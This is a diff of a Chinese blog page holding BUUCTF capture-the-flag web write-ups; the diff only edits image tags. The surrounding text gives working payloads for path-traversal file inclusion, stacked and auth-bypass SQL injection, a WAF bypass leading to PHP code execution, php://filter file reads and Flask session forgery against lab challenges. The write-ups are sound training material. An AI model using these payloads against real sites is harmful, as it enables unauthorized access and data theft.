@@ -113,7 +113,7 @@ if (autoChangeMode === '1') {
 <p>本题难点就是得想到如何利用字符串切割绕开白名单判断且能任何文件包含，其实也很简单：<code>source.php?file=hint.php?/../任意文件</code>即可。</p>
 <p>EXP: <code>source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
 <h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>注入题，老规矩，先来个单引号试试：</p>
-<p><img src="/img/loading.gif" alt="题目页面" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200721181223.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200721181223.png" alt="题目页面"></p>
 <p>尝试老套路拼接<code>union select</code>之后发现被拦截了，拦截代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
 <p>发现<code>select</code>被禁止了，这种情况下，通常的注入方法，如<code>盲注</code>、<code>报错注入</code>等都在这不好使了。</p>
@@ -159,7 +159,7 @@ if (autoChangeMode === '1') {
 <p>通过将<code>||</code>符号的含义改变成拼接字符串即可带出flag的值（如果是||其他东西就不行了）。</p>
 <p>EXP：<code>1;set sql_mode=pipes_as_concat;select 1</code></p>
 <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>cl4y师傅写的题，出的还算简单，打开题目就亮瞎了我的狗眼，不愧是羽哥哥。</p>
-<p><img src="/img/loading.gif" alt="EasySQL题目页面" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200722004151.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200722004151.png" alt="EasySQL题目页面"></p>
 <p>其实这个页面没啥用，真正功能在check.php。随便输入一个数据：<code>check.php?username=1&amp;password=1</code>，提示用户名与密码错误。</p>
 <p>老规矩，单双引号与反斜杠走起，尝试单引号时就报错了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
@@ -204,7 +204,7 @@ if (autoChangeMode === '1') {
 <h3 id="法一：PHP黑魔法-20num"><a href="#法一：PHP黑魔法-20num" class="headerlink" title="法一：PHP黑魔法%20num"></a>法一：PHP黑魔法%20num</h3><p>PHP在接受请求参数时会忽略开头的空格，也就是说<code>?%20%20num=a</code>相当于<code>$_GET[&#39;num&#39;]=a</code>的效果。</p>
 <p>WAF判断的参数仅是num，而对于%20num他是不做拦截的。</p>
 <h3 id="法二：HTTP走私攻击"><a href="#法二：HTTP走私攻击" class="headerlink" title="法二：HTTP走私攻击"></a>法二：HTTP走私攻击</h3><p>这也是WAF绕过的老法子之一了，用在这里也是正常的操作。</p>
-<p><img src="/img/loading.gif" alt="HTTP走私" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200722042731.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200722042731.png" alt="HTTP走私"></p>
 <p>而对于单双引号被过滤的情况如何表示字符串，由于PHP的灵活性有挺多的法子，这里列举两个：</p>
 <ul>
 <li>一是利用chr()等转换函数，将ascii码转成单个字符串在用<code>.</code>拼接。</li>
@@ -213,19 +213,19 @@ if (autoChangeMode === '1') {
 <p>EXP：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%20num&#x3D;var_dump(scandir(~%d0)) &#x2F;&#x2F; 列出根目录下的全部文件名</span><br><span class="line">calc.php?%20num&#x3D;highlight_file(~%D0%99%CE%9E%98%98) &#x2F;&#x2F; 读flag文件</span><br></pre></td></tr></table></figure>
 <h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p>打开题目，啥信息都没有，不清楚考点。老规矩，先查看返回头、HTML源代码，若无结果再开扫描器。</p>
-<p><img src="/img/loading.gif" alt="题目页面" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200724231241.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200724231241.png" alt="题目页面"></p>
 <p>在HTML源代码处发现提示：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"master"</span> <span class="attr">href</span>=<span class="string">"./Archive_room.php"</span> <span class="attr">style</span>=<span class="string">"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;"</span>&gt;</span>Oh! You found me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>打开<code>/Archive_room.php</code>文件，得：</p>
-<p><img src="/img/loading.gif" alt="跳转链接" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200724231506.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200724231506.png" alt="跳转链接"></p>
 <p>点击之后发现被跳转到了<code>end.php</code>，易知<code>action.php</code>返回了跳转信息。打开Burpsuite抓取数据包重放得到：</p>
-<p><img src="/img/loading.gif" alt="Burp抓包重放" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200724231645.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200724231645.png" alt="Burp抓包重放"></p>
 <p>访问之，得PHP源代码一份：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="comment">// 简单防搅屎措施</span></span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>很容易就知道此处的考点应该是LFI读文件，EXP：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
 <p>得到Base64编码过的flag.php源代码，解密之即可得flag。</p>
-<p><img src="/img/loading.gif" alt="Base64解码" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200724232057.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200724232057.png" alt="Base64解码"></p>
 <h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>这题出的是真的不错，学到了很多东西，多刷好题还是有用的。</p>
 <p>打开题目，在首页的HTML源代码处发现注释：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>
@@ -264,7 +264,7 @@ if (autoChangeMode === '1') {
 <p>SECRET_KEY可能为<code>ckj123</code>，如此一来我们便可以生成相应的hash拼接上我们的伪造的数据达到伪造session的作用。</p>
 <p>利用脚本：<code>https://github.com/noraj/flask-session-cookie-manager</code></p>
 <h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>打开题目，看样子应该是前面那道简单题的简单升级版。</p>
-<p><img src="/img/loading.gif" alt="LoveSQL题目页面" class="lazyload" data-src="https://img.0x002.com/article/BuuCTF/20200725203647.png"></p>
+<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF/20200725203647.png" alt="LoveSQL题目页面"></p>
 <p>随便输入一些数据，跳转到：<code>/check.php?username=1&amp;password=1</code>。</p>
 <p>老样子，在username与password分别单独加单引号，发现均返回错误。说明应该是之前讲的第一种判断逻辑。</p>
 <p>老EXP尝试：<code>username=1&#39;%20or1%3d1%23&amp;password=1</code>，成功登录，返回了管理员密码的密文值，看长度应该是MD5。</p>
